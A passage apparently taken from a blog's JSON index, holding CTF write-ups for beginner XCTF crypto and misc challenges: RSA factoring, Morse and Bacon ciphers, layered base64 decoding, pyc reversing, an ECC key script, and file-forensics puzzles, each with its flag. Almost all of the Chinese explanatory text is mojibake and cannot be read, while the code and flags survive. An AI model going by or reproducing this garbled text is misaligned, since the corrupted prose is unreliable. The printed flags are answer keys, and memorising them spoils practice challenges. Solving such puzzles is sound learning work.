å°†å¤§æ•´æ•°åˆ†è§£ä¸ºpï¼Œq #p= 275127860351348928173285174381581152299  #q= 319576316814478949870590164193048041239 #4 åˆ©ç”¨rsatool ç”Ÿæˆç§é’¥æ–‡ä»¶ private.pem $python rsatool.py -o private.pem -e 65537 -p XXX -q XXX #5 $openssl rsautl -decrypt -in flag.enc -inkey private.pem   0x09 ä¸ä»…ä»…æ˜¯Morse  é¢˜ç›®æè¿°ï¼šâ€œè¿™ä¸ªé¢˜ç›®å’Œæˆ‘ä»¬åˆšåˆšåšçš„é‚£ä¸ªå¥½åƒå•Šä½†æ˜¯ä¸ºä»€ä¹ˆæŒ‰ç…§åˆšåˆšçš„æ–¹æ³•åšå‡ºæ¥ç­”æ¡ˆå´ä¸å¯¹å‘¢â€ ï¼Œä½ å¥‡æ€ªçš„é—®äº†é—®å°é±¼ï¼Œâ€œå¯èƒ½æ˜¯å› ä¸ºè¿˜æœ‰ä¸€äº›å¥‡æ€ªçš„åŠ å¯†æ–¹å¼åœ¨é‡Œé¢å§ï¼Œæˆ‘ä»¬åœ¨ä»”ç»†è§‚å¯Ÿè§‚å¯Ÿâ€ã€‚ä¸¤ä¸ªäºº å®‰å®‰é™é™çš„åä¸‹æ¥å¼€å§‹æ€è€ƒï¼Œå¾ˆè€å¿ƒçš„æŠŠè‡ªå·±å¯ä»¥æƒ³åˆ°çš„åŠ å¯†æ–¹å¼ä¸€ç§ç§çš„è¿‡äº†ä¸€éï¼Œåå¤šåˆ†é’Ÿåä¸¤ä¸ªäºº å¼‚å£åŒå£°çš„è¯´â€œæˆ‘æƒ³åˆ°äº†ï¼â€ã€‚ä¸€ç§é£Ÿç‰©,æ ¼å¼ä¸ºcyberpeace{å°å†™çš„ä½ è§£å‡ºçš„ç­”æ¡ˆ}\n é¢˜ç›®é™„ä»¶ç»™äº†ä¸€å¤§ä¸²æ‘©æ–¯ç”µç ï¼ŒæŒ‰å¸¸ç†æ‰¾ä¸€ä¸ªç½‘ç«™è§£å¯†äº†\n--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.- æ‘©æ–¯ç”µç è§£å¯†ç½‘ç«™ï¼š http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx\nè§£å‡ºæ¥å¦‚ä¸‹ï¼Œæ˜æ˜¾åµŒå¥—äº†å¦å¤–ä¸€ç§åŠ å¯†\nMAY..--.-BE..--.-HAVE..--.-ANOTHER..--.-DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA å› ä¸ºåé¢ä¸€ä¸²ABä¸²ï¼Œè½¬æ‘©æ–¯ç¿»è¯‘ä¸å‡ºæ¥ï¼Œå› ä¸ºä¸æ™“å¾—å“ªé‡Œåˆ†ç•Œï¼Œè½¬ä¸ºäºŒè¿›åˆ¶ä¹Ÿæ²¡æœ‰æ€è·¯ï¼Œç™¾åº¦å¾—çŸ¥è¿™æ˜¯åŸ¹æ ¹å¯†ç \nåŸ¹æ ¹å¯†ç è§£å¯†ç½‘ç«™ï¼š http://rumkin.com/tools/cipher/baconian.php\nABä¸²è§£å¾—ATTACKANDDEFENCEWORLDISINTERESTING\nè®°å¾—å°å†™ã€‚\n0x0a æ··åˆç¼–ç   é¢˜ç›®æè¿°ï¼šç»è¿‡äº†å‰é¢é‚£ä¹ˆå¤šé¢˜ç›®çš„å†ç»ƒï¼Œè€å¿ƒç»†è‡´åœ¨è§£é¢˜å½“ä¸­æ˜¯ å¿…ä¸å¯å°‘çš„å“è´¨ï¼Œåˆšå·§ä½ ä»¬éƒ½æœ‰ï¼Œä½ å’Œå°é±¼è¶Šæ¥è¶Šå…¥è¿·ã€‚é‚£ä¹ˆèµ°å‘äº†ä¸‹ä¸€ä¸ªé¢˜ç›®ï¼Œè¿™ä¸ªé¢˜ç›®å¥½é•¿ å¥½é•¿ï¼Œä½ çŸ¥é“ä½ ä»¬åªè¦ç»†å¿ƒç»†è‡´ï¼Œç­”æ¡ˆæ€»ä¼šè¢«ä½ ä»¬åšå‡ºæ¥çš„ï¼Œä½ ä»¬å¼€å§‹æ…¢æ…¢çš„å°è¯•ï¼Œæ…¢æ…¢çš„çŒœæƒ³ ï¼ŒåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œåœ¨ä½ ä»¬è€å¿ƒçš„ä¸€æ­¥æ­¥çš„è§£ç­”ä¸‹ï¼Œç­”æ¡ˆè·ƒç„¶çº¸ä¸Šï¼Œä½ ä¿©é»˜å¥‘ä¸€ç¬‘ï¼Œç›¸è§†å‡»æŒ èµ°å‘äº†ä¸‹é¢çš„æŒ‘æˆ˜ã€‚æ ¼å¼ä¸ºcyberpeace{å°å†™çš„ä½ è§£å‡ºçš„ç­”æ¡ˆ}\n è¿™é¢˜æ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸‹è½½é™„ä»¶å‘ç°\nJiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow== æ˜æ˜¾çš„base64ç¼–ç ï¼Œè§£base64å¾—åˆ°å¦‚ä¸‹ï¼š\n\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#79;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#69;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#52;\u0026#76;\u0026#122;\u0026#107;\u0026#53;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#77;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#107;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#120;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#78;\u0026#105;\u0026#56;\u0026#120;\u0026#77;\u0026#84;\u0026#69;\u0026#118;\u0026#79;\u0026#84;\u0026#99;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#50;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#78;\u0026#105;\u0026#56;\u0026#53;\u0026#78;\u0026#121;\u0026#56;\u0026#53;\u0026#79;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#99;\u0026#118;\u0026#79;\u0026#84;\u0026#99;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#119;\u0026#76;\u0026#122;\u0026#69;\u0026#119;\u0026#77;\u0026#67;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#65;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#120;\u0026#76;\u0026#122;\u0026#69;\u0026#119;\u0026#77;\u0026#105;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#69;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#119;\u0026#76;\u0026#122;\u0026#107;\u0026#53;\u0026#76;\u0026#122;\u0026#69;\u0026#119;\u0026#77;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#84;\u0026#107;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#120;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#78;\u0026#67;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#103;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#119; æ˜æ˜¾çš„unicodeç¼–ç ï¼Œè§£ç å¾—åˆ°å¦‚ä¸‹\nLzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw æ²¡æœ‰æ˜æ˜¾ç‰¹å¾ï¼Œè§£ä¸€æ³¢base64å¾—åˆ°å¦‚ä¸‹\n/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100 ç›²çŒœAsciiå—\n1 2 3 4 5 6 7  \u003e\u003e\u003e a = '/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100' \u003e\u003e\u003e l = a.split('/') \u003e\u003e\u003e s = '' \u003e\u003e\u003e for i in range(30):#ä»i+1å¼€å§‹å› ä¸º/çš„åŸå› ï¼Œl[0] = '' ... s += chr(int(l[i+1])) \u003e\u003e\u003e s 'welcometoattackanddefenceworld'   å¾—åˆ°flagï¼šcyberpeace{welcometoattackanddefenceworld}\n0x0b easychallenge  é¢˜ç›®æè¿°ï¼šä½ ä»¬èµ°åˆ°äº†ä¸€ä¸ªå†·å†·æ¸…æ¸…çš„è°œé¢˜å‰é¢ï¼Œå°é±¼çœ‹ç€é¢˜ç›®ç»™çš„ä¿¡æ¯æŸæ‰‹æ— ç­–ï¼Œä¸ˆäºŒå’Œå°šæ‘¸ä¸ç€å¤´è„‘ ï¼Œä½ å˜¿å˜¿ä¸€ç¬‘ï¼Œæ‹¿å‡ºæ¥äº†ä½ éšèº«å¸¦ç€çš„ç¬”è®°æœ¬ç”µè„‘ï¼Œå™¼é‡Œå•ªå•¦çš„æ•²èµ·æ¥äº†é”®ç›˜ï¼Œæ¸…æ™°çš„å‡½æ•°é€»è¾‘å’Œæµç¨‹å‡ºç°åœ¨ äº†ç”µè„‘å±å¹•ä¸Šï¼Œä½ æ•²æ•²é”®ç›˜ï¼Œæ›´æ”¹äº†å‡ å¤„åœ°æ–¹ï¼Œè¿è¡Œä»¥åç­”æ¡ˆå˜å‡ºç°åœ¨äº†ç”µè„‘å±å¹•ä¸Šã€‚\n ä¸‹è½½é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªpycæ–‡ä»¶ï¼Œæ˜æ˜¾æ˜¯ä¸€ä¸ªå·²ç»ç¼–è¯‘çš„pythonæ–‡ä»¶\nç™¾åº¦æœåç¼–è¯‘pycï¼Œæ‰¾åˆ°ä¸€ä¸ªåœ¨çº¿åç¼–è¯‘ç½‘ç«™ https://tool.lu/pyc/\nåç¼–è¯‘å¾—åˆ°æºä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  #!/usr/bin/env python # encoding: utf-8 # å¦‚æœè§‰å¾—ä¸é”™ï¼Œå¯ä»¥æ¨èç»™ä½ çš„æœ‹å‹ï¼http://tool.lu/pyc import base64 def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return s def encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return s def encode3(ans): return base64.b32encode(ans) flag = ' ' print 'Please Input your flag:' flag = raw_input() final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' if encode3(encode2(encode1(flag))) == final: print 'correct' else: print 'wrong'   æ˜“çŸ¥chrå’Œordä¸ºåå‡½æ•°ã€x^a^a=xã€base64.b32decode()å’Œbase64.b32encode()äº’ä¸ºåå‡½æ•°\nå› æ­¤å†™ä¸€ä¸ªpythonè„šæœ¬å³å¯å¾—å‡ºflag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u003e\u003e\u003e final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' \u003e\u003e\u003e import base64 \u003e\u003e\u003e a = base64.b32decode(final)#decode3 \u003e\u003e\u003e a b'\\xa0\\xbe\\xa7Z\\xb7\\xb5Z\\xa6\\xa0Z\\xb8\\xae\\xa3\\xa9Z\\xb7Z\\xb0\\xa9\\xae\\xa3\\xa4\\xad\\xad\\xad\\xad\\xad\\xb2' #æ³¨æ„è¦å°†açš„å­—èŠ‚æµè½¬æ¢ \u003e\u003e\u003e b = \"\\xa0\\xbe\\xa7Z\\xb7\\xb5Z\\xa6\\xa0Z\\xb8\\xae\\xa3\\xa9Z\\xb7Z\\xb0\\xa9\\xae\\xa3\\xa4\\xad\\xad\\xad\\xad\\xad\\xb2\" \u003e\u003e\u003e s = ''#decode2 \u003e\u003e\u003e for i in b: ... s += chr((ord(i)^36)-36) ... \u003e\u003e\u003e \u003e\u003e\u003e s '`v_ZomZ^`ZxfciZoZpifc\\\\eeeeer' \u003e\u003e\u003e l = ''#decode1 \u003e\u003e\u003e for i in s: ... l+= chr((ord(i)-25)^36) ... \u003e\u003e\u003e l 'cyberpeace{interestinghhhhh}'   PSï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13  #ç¼–è¯‘pythonæ–‡ä»¶ä¸º.pycæ–‡ä»¶ $python -m compileall main.py #pycçš„åç¼–è¯‘ #ä¾èµ–pythonçš„uncompyle $pip install uncompyle #æŸ¥çœ‹å¸®åŠ© $uncompyle6 --help #å°†models.pycåç¼–è¯‘æˆmodels.py $uncompyle6 models.pyc \u003e models.py   åˆ©ç”¨uncompyle6åç¼–è¯‘çš„pycæ–‡ä»¶å’Œåœ¨çº¿ç¼–è¯‘æ–‡ä»¶ç›¸åŒï¼Œä¹ŸæŒºå¿«çš„\n0x0c easy_ECC  é¢˜ç›®æè¿°ï¼šè½¬çœ¼ä¸¤ä¸ªäººåˆèµ°åˆ°äº†ä¸‹ä¸€ä¸ªè°œé¢˜çš„åœ°æ–¹ï¼Œè¿™åˆæ˜¯ä¸€ç§ç»å…¸çš„å¯†ç å­¦åŠ å¯†æ–¹å¼ è€Œä½ åˆšå¥½æ²¡æœ‰è¿™ä¸ªçš„å·¥å…·ï¼Œä½ å¯¹å°é±¼è¯´â€œå°é±¼æˆ‘çŸ¥é“æ•°å­¦çœŸçš„å¾ˆé‡è¦äº†ï¼Œæœ‰äº†å·¥å…·åªæ˜¯æ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨ æ‡‚äº†åŸç†æ‰èƒ½åšåˆ°ï¼Œå°é±¼ä½ æ•™æˆ‘ä¸€ä¸‹è¿™ä¸ªç¼‡åŠªæ€ä¹ˆåšå§ï¼â€åœ¨å°é±¼çš„ä¸€æ­¥æ­¥å¸¦é¢†ä¸‹ï¼Œä½ ç»ˆäºæ˜ç™½äº†ECC çš„åŸºæœ¬åŸç†ï¼ŒæˆåŠŸçš„è§£å¼€äº†è¿™ä¸ªé¢˜ç›®ï¼Œä¸¤ä¸ªäººç›¸è§†ä¸€ç¬‘ï¼Œå¿«æ­¥èµ°å‘äº†ä¸‹ä¸€ä¸ªé¢˜ç›®æ‰€åœ¨çš„ä½ç½®ã€‚flagæ ¼å¼ä¸ºcyberpeace{x+yçš„å€¼}\n ç”±é¢˜ç›®å¯çŸ¥ï¼šè¿™æ˜¯ECCåŠ å¯†\nå·²çŸ¥æ¤­åœ†æ›²çº¿åŠ å¯†Ep(a,b)å‚æ•°ä¸º p = 15424654874903 a = 16546484 b = 4548674875 G(6478678675,5636379357093) ç§é’¥ä¸º k = 546768 æ±‚å…¬é’¥K(x,y) åˆå› ä¸ºé¢˜ç›®è¯´å·¥å…·ï¼Œäº†è§£å…¶ç®—æ³•åï¼Œä¾¿æ‰¾åˆ°äº†ä¸€ä¸ªpythonçš„è„šæœ¬è®¡ç®—å…¬é’¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164  import collections import random EllipticCurve = collections.namedtuple('EllipticCurve', 'name p a b g n h') curve = EllipticCurve( 'secp256k1', # Field characteristic. p=int(input('p=')), # Curve coefficients. a=int(input('a=')), b=int(input('b=')), # Base point. g=(int(input('Gx=')), int(input('Gy='))), # Subgroup order. n=int(input('k=')), # Subgroup cofactor. h=1, ) # Modular arithmetic ########################################################## def inverse_mod(k, p): \"\"\"Returns the inverse of k modulo p. This function returns the only integer x such that (x * k) % p == 1. k must be non-zero and p must be a prime. \"\"\" if k == 0: raise ZeroDivisionError('division by zero') if k \u003c 0: # k ** -1 = p - (-k) ** -1 (mod p) return p - inverse_mod(-k, p) # Extended Euclidean algorithm. s, old_s = 0, 1 t, old_t = 1, 0 r, old_r = p, k while r != 0: quotient = old_r // r old_r, r = r, old_r - quotient * r old_s, s = s, old_s - quotient * s old_t, t = t, old_t - quotient * t gcd, x, y = old_r, old_s, old_t assert gcd == 1 assert (k * x) % p == 1 return x % p # Functions that work on curve points ######################################### def is_on_curve(point): \"\"\"Returns True if the given point lies on the elliptic curve.\"\"\" if point is None: # None represents the point at infinity. return True x, y = point return (y * y - x * x * x - curve.a * x - curve.b) % curve.p == 0 def point_neg(point): \"\"\"Returns -point.\"\"\" assert is_on_curve(point) if point is None: # -0 = 0 return None x, y = point result = (x, -y % curve.p) assert is_on_curve(result) return result def point_add(point1, point2): \"\"\"Returns the result of point1 + point2 according to the group law.\"\"\" assert is_on_curve(point1) assert is_on_curve(point2) if point1 is None: # 0 + point2 = point2 return point2 if point2 is None: # point1 + 0 = point1 return point1 x1, y1 = point1 x2, y2 = point2 if x1 == x2 and y1 != y2: # point1 + (-point1) = 0 return None if x1 == x2: # This is the case point1 == point2. m = (3 * x1 * x1 + curve.a) * inverse_mod(2 * y1, curve.p) else: # This is the case point1 != point2. m = (y1 - y2) * inverse_mod(x1 - x2, curve.p) x3 = m * m - x1 - x2 y3 = y1 + m * (x3 - x1) result = (x3 % curve.p, -y3 % curve.p) assert is_on_curve(result) return result def scalar_mult(k, point): \"\"\"Returns k * point computed using the double and point_add algorithm.\"\"\" assert is_on_curve(point) if k \u003c 0: # k * point = -k * (-point) return scalar_mult(-k, point_neg(point)) result = None addend = point while k: if k \u0026 1: # Add. result = point_add(result, addend) # Double. addend = point_add(addend, addend) k \u003e\u003e= 1 assert is_on_curve(result) return result # Keypair generation and ECDHE ################################################ def make_keypair(): \"\"\"Generates a random private-public key pair.\"\"\" private_key = curve.n public_key = scalar_mult(private_key, curve.g) return private_key, public_key private_key, public_key = make_keypair() print(\"private key:\", hex(private_key)) print(\"public key: (0x{:x}, 0x{:x})\".format(*public_key))   1 2 3 4 5 6 7 8 9 10 11 12 13 14  $python ecc_calKey.py p=15424654874903 a=16546484 b=4548674875 Gx=6478678675 Gy=5636379357093 k=546768 private key: 0x857d0 public key: (0xcb19fe553fa, 0x50545408eb4) $python \u003e\u003e\u003e 0x50545408eb4+0xcb19fe553fa 19477226185390 \u003e\u003e\u003e   ","description":"","tags":["ctf","crypto"],"title":"XCTF-adworld-crypto-wp","uri":"/posts/xctf-adworld-crypto-wp/"},{"categories":["misc"],"content":"Misc\u0026WriteUp msicæ°¸è¿œå……æ»¡äº†æƒŠå–œ\næ”»é˜²ä¸–ç•Œ\u0026Miscæ–°æ‰‹ç»ƒä¹ åŒº 0x01 this_is_flag  é¢˜ç›®æè¿°ï¼š Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}\n æ˜“çŸ¥flagä¸ºï¼šflag{th1s_!s_a_d4m0_4la9} \n0x02 ext3  é¢˜ç›®æè¿°ï¼š ä»Šå¤©æ˜¯èœç‹—çš„ç”Ÿæ—¥ï¼Œä»–æ”¶åˆ°äº†ä¸€ä¸ªlinuxç³»ç»Ÿå…‰ç›˜\n ä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€ä¸ª19.5MBçš„æ–‡ä»¶ï¼Œç”±äºé¢˜ç›®æ˜¯ext3ï¼Œæ‰€ä»¥è”æƒ³åˆ°å°†è¯¥æ–‡ä»¶æŒ‚è½½è‡³linuxä¸‹\nè¿è¡Œmount test /mnt/,ç„¶åå‘ç°ä¸‹é¢æœ‰ä¸€å †æ–‡ä»¶\næ‰§è¡Œfind |grep flagï¼Œå¾—åˆ°./O7avZhikgKgbF/flag.txt\nç”¨catå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸²å­—ç¬¦ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=\næ˜æ˜¾çš„base64ç¼–ç ï¼Œè½¬ç å¾—åˆ°flagï¼šflag{sajbcibzskjjcnbhsbvcjbjszcszbkzj} \n ä½†æ˜¯çœ‹å®˜æ–¹wpï¼Œå‘ç°æ˜¯å¦å¤–ä¸€ç§åšæ³•ã€‚\nä¸çŸ¥é“ä¸ºå•¥åˆ¤æ–­é™„ä»¶ä¸ºimgæ ¼å¼ï¼Œç„¶åç”¨winhexæ‰“å¼€è¯¥æ–‡ä»¶æœç´¢flagå¾—åˆ°å¦‚ä¸‹\nç„¶åè§£å‹è¯¥æ–‡ä»¶ï¼ˆæˆ‘ç”¨bandzipæ²¡æœ‰æ‰“å¼€ï¼Œæ”¹åç¼€ä¸ºimgè£…è½½æ˜¾ç¤ºå…‰ç›˜æ˜ åƒå·²æŸåï¼‰ï¼Œæœç´¢å¾—åˆ°flag.txtï¼Œç„¶åå…¶ä»–æ­¥éª¤ç›¸åŒ\n0x03 give_you_flag  é¢˜ç›®æè¿°ï¼šèœç‹—æ‰¾åˆ°äº†æ–‡ä»¶ä¸­çš„å½©è›‹å¾ˆå¼€å¿ƒï¼Œç»™èœçŒ«å‘äº†ä¸ªè¡¨æƒ…åŒ…\n ä¸‹è½½é™„ä»¶ï¼Œå‘ç°æ˜¯ä¸€ä¸ªgifæ–‡ä»¶ï¼Œæ‰“å¼€æŸ¥çœ‹å‘ç°åœ¨æœ€åå‡ ç§’é—ªè¿‡ä¸€ä¸ªäºŒç»´ç \nç¬¬ä¸€æ¬¡åšå‚»å‚»åœ°ç”¨äº†linuxä¸‹convertå‘½ä»¤ï¼Œå°†gifè½¬åˆ°pngï¼Œå‘ç°50å¤šå¸§éƒ½è¢«æ‹†åˆ†æˆä¸€ä¸ªä¸ªpngï¼Œ\näºŒç»´ç å¤§æ¦‚åœ¨49å¸§ï¼Œåé¢æ‰å‘ç°æœ‰Stegsolveå¯ä»¥æŸ¥çœ‹å›¾ç‰‡çš„æ¯ä¸€å¸§\næ˜æ˜¾æ˜¯ä¸ªäºŒç»´ç ï¼Œä¿®è¡¥å…¶ä¸‰è§’å®šä½ï¼Œå¾—åˆ°ä¸‹å›¾\næ‰«ç å¾—åˆ°flagï¼š flag{e7d478cf6b915f50ab1277f78502a2c5}\n0x04 pdf  é¢˜ç›®æè¿°ï¼šèœçŒ«ç»™äº†èœç‹—ä¸€å¼ å›¾ï¼Œè¯´å›¾ä¸‹é¢ä»€ä¹ˆéƒ½æ²¡æœ‰\n æ‰“å¼€é™„ä»¶æ˜¯ä¸€ä¸ªpdfï¼Œé‡Œé¢æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œæ¨æµ‹å°†pdfè½¬ä¸ºwordæ ¼å¼ä¹‹åï¼Œç§»èµ°å›¾ç‰‡ï¼Œå‘ç°flagå°±åœ¨å›¾ç‰‡åº•ä¸‹\næ˜“çŸ¥å¾—åˆ°flagï¼šflag{security_through_obscurity}\n0x05 stegano  é¢˜ç›®æè¿°ï¼šèœç‹—æ”¶åˆ°äº†å›¾åå¾ˆå¼€å¿ƒï¼Œç©èµ·äº†pdf æäº¤æ ¼å¼ä¸ºflag{xxx}ï¼Œè§£å¯†å­—ç¬¦éœ€å°å†™\n æ‰“å¼€é™„ä»¶å‘ç°ä¸€ä»½æ–‡æ¡£\nä¸€å¼€å§‹æ²¡æœ‰æ€è·¯ï¼Œå°±å…ˆç”¨ä¹‹å‰çš„convertå‘½ä»¤ï¼Œå°†pdfçš„ä¸œè¥¿å…¨éƒ¨å¤åˆ¶å‡ºæ¥æŸ¥çœ‹ï¼Œå‘ç°\nå°†ABè½¬æ¢ä¸º. - å¯å¾—åˆ°å¦‚ä¸‹\n -.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...-- è§£æ‘©æ–¯å¯†ç å¾—åˆ°ï¼šCONGRATULATIONSFLAG1NV151BL3M3554G3\nflagä¸ºï¼šflag{1NV151BL3M3554G3}\n0x06 SimpleRAR  é¢˜ç›®æè¿°ï¼šèœç‹—æœ€è¿‘å­¦ä¼šäº†æ‹¼å›¾ï¼Œè¿™æ˜¯ä»–åˆšæ‹¼å¥½çš„ï¼Œå¯æ˜¯å´æé”™äº†ä¸€å—(ps:åŒå›¾å±‚)\n ä¸‹è½½å®Œé™„ä»¶ï¼Œåªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€flag.txt ,é‡Œé¢å†™ç€flag is not here\næ‰“å¼€winhexæŸ¥çœ‹è¯¥rarï¼Œå‘ç°é‡Œé¢è¿˜æœ‰ä¸€ä¸ªsecret.pngï¼Œç„¶åæ ¹æ®æ–‡ä»¶å¤´ï¼ˆæˆ–è€…ä½¿ç”¨rarä¿®å¤ï¼‰ å°†A8 3C 7A ä¿®æ”¹ä¸º A8 3C 74 ã€‚\nç„¶åè§£å‹å¾—åˆ°secret.pngï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ªç©ºç™½å›¾ç‰‡ï¼Œä¾¿æƒ³åˆ°ç”¨winhexæŸ¥çœ‹ã€‚\nå‘ç°æ–‡ä»¶å¤´æ˜¯GIFï¼Œå°†åç¼€æ”¹ä¸º.gifï¼Œç„¶åç”¨Stegsolveåˆ†ç¦»å‡ºä¸¤å¸§å›¾ç‰‡ï¼Œåˆ†åˆ«æ˜¯äºŒç»´ç çš„ä¸Šä¸‹éƒ¨åˆ†ï¼Œè¿˜å°‘å®šä½ç¬¦ï¼Œè¡¥é½å®šä½ç¬¦ï¼Œæ‰«ç å¾—åˆ°flagï¼šflagï¼šflag{yanji4n_bu_we1shi}\n0x07 åšæŒ60s  é¢˜ç›®æè¿°ï¼šèœç‹—å‘ç°æœ€è¿‘èœçŒ«ä¸çˆ±ç†ä»–ï¼Œåè€Œè¿·ä¸Šäº†èœé¸¡\n 